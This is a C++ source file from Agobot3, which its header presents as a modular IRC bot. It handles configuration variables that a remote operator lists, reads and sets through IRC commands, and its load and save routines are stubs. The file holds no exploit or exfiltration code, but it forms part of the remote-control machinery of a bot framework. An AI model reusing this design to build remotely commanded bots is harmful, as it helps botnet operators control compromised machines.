/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "cvar.h"
#include "mainctrl.h"
	
CCVar::CCVar() { m_lCvars.clear(); }
CCVar::~CCVar() { m_lCvars.clear(); }
void CCVar::Init()
{	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdList,			"cvar.list",		"prints a list of all cvars",	this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdGet,			"cvar.get",			"gets the content of a cvar",	this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdSet,			"cvar.set",			"sets the content of a cvar",	this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdLoadConfig,	"cvar.loadconfig",	"loads config from a file",		this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdSaveConfig,	"cvar.saveconfig",	"saves config to a file",		this); }

void CCVar::RegisterCvar(cvar *pCvar, const CString &sName, const CString &sValue, const CString &sDescription, bool bSave, bool bEncrypted, int iKey)
{	pCvar->sName.Assign(sName); pCvar->sDescription.Assign(sDescription); pCvar->bSave=bSave;
	pCvar->sValue.m_bIsCryptStr=bEncrypted; pCvar->sValue.m_iCryptKey=iKey; pCvar->sValue.Assign(sValue);
	SetCVar(pCvar, sValue); m_lCvars.push_back(pCvar); }
void CCVar::RegisterCvar(cvar *pCvar, const char *szName, const char *szValue, const char *szDescription, bool bSave, bool bEncrypted, int iKey)
{	RegisterCvar(pCvar, CString(szName), CString(szValue), CString(szDescription), bSave, bEncrypted, iKey); }

cvar *CCVar::FindCvarByName(const CString &sName, bool bExact)
{	list<cvar*>::iterator ic; int iCount=0;
	for(ic=m_lCvars.begin(); ic!=m_lCvars.end(); ++ic)
		if(!(*ic)->sName.CompareNoCase(sName)) return (*ic);
    return NULL; }
cvar *CCVar::FindCvarByName(const char *szName, bool bExact)
{	return FindCvarByName(CString(szName), bExact); }

bool CCVar::ParseConfig(const CString &sFilename)
{	return true; }
bool CCVar::ParseConfig(const char *szFilename)
{	return ParseConfig(CString(szFilename)); }

bool CCVar::SaveConfig(const CString &sFilename)
{	return true; }
bool CCVar::SaveConfig(const char *szFilename)
{	return SaveConfig(CString(szFilename)); }

void CCVar::SetCVar(cvar *pCvar, const char *szValue)
{	pCvar->sValue.Assign(szValue);
	pCvar->fValue=(float)atof(pCvar->sValue.CStr()); pCvar->iValue=atoi(pCvar->sValue.CStr());
	pCvar->bValue=false; if(!pCvar->sValue.Compare("true")) pCvar->bValue=true; }

void CCVar::SetCVar(cvar *pCvar, const CString &sValue)
{	pCvar->sValue.Assign(sValue);
	pCvar->fValue=(float)atof(pCvar->sValue.CStr()); pCvar->iValue=atoi(pCvar->sValue.CStr());
	pCvar->bValue=false; if(!pCvar->sValue.Compare("true")) pCvar->bValue=true; }

void CCVar::SetCVar(cvar *pCvar, float fValue)
{	pCvar->sValue.Format("%f", fValue);
	pCvar->fValue=fValue; pCvar->iValue=atoi(pCvar->sValue.CStr());
	pCvar->bValue=false; if(fValue>=1) pCvar->bValue=true; }

void CCVar::SetCVar(cvar *pCvar, bool bValue)
{	if(bValue) { pCvar->sValue.Assign("true"); pCvar->fValue=1.0f; pCvar->iValue=1; } 
	else { pCvar->sValue.Assign("false"); pCvar->fValue=0.0f; pCvar->iValue=0; }
	pCvar->bValue=bValue; }

void CCVar::SetCVar(cvar *pCvar, int iValue)
{	pCvar->sValue.Format("%d", iValue);
	pCvar->fValue=(float)iValue; pCvar->iValue=iValue;
	pCvar->bValue=false; if(iValue>=1) pCvar->bValue=true; }

bool CCVar::HandleCommand(CMessage *pMsg)
{	if(!pMsg->sCmd.Compare("cvar.list"))
	{	g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "-[ cvar list ]-", pMsg->sReplyTo.Str());
		list<cvar*>::iterator ic; int iCount=0;
		for(ic=m_lCvars.begin(); ic!=m_lCvars.end(); ++ic)
		{	iCount++; g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "%d. / \"%s\" / \"%s\" / \"%s\"", \
				iCount, (*ic)->sName.CStr(), (*ic)->sValue.CStr(), (*ic)->sDescription.CStr());
			Sleep(1500); }
		return true; }

	else if(!pMsg->sCmd.Compare("cvar.get"))
	{	cvar *pTemp=FindCvarByName(pMsg->sChatString.Token(1, " "), true);
		if(pTemp) return g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "%s == \"%s\"", pTemp->sName.CStr(), pTemp->sValue.CStr());
		else return false; }

	else if(!pMsg->sCmd.Compare("cvar.set"))
	{	cvar *pTemp=FindCvarByName(pMsg->sChatString.Token(1, " "), true);
		if(pTemp) { CString sOldStr(pTemp->sValue); SetCVar(pTemp, pMsg->sChatString.Token(2, " ", true));
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "%s = \"%s\" (was \"%s\")", pTemp->sName.CStr(), pTemp->sValue.CStr(), sOldStr.CStr());
			return true; }
		else return false; }

	else if(!pMsg->sCmd.Compare("cvar.loadconfig"))
	{	if(ParseConfig(CString("")))
			return g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "Successfully loaded config...");
		else
		{	g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "Unable to load config...");
			return false; } }

	else if(!pMsg->sCmd.Compare("cvar.saveconfig"))
	{	if(SaveConfig(CString("")))
			return g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "Successfully saved config...");
		else
		{	g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "Unable to save config...");
			return false; } }

	return false; }
